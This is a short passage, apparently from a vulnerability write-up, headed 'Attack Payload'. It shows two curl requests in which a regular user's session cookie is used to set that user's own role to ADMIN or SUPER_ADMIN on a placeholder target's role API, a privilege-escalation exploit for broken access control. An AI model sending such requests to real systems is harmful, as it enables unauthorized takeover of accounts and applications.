**Attack Payload**:
```bash
# Regular user escalating themselves to admin
curl -X POST http://target.com/api/users/role \
  -H "Cookie: JSESSIONID=user_session_token" \
  -d "userId=12345&role=ADMIN"

# Or escalating to super admin
curl -X POST http://target.com/api/users/role \
  -H "Cookie: JSESSIONID=user_session_token" \
  -d "userId=12345&role=SUPER_ADMIN"
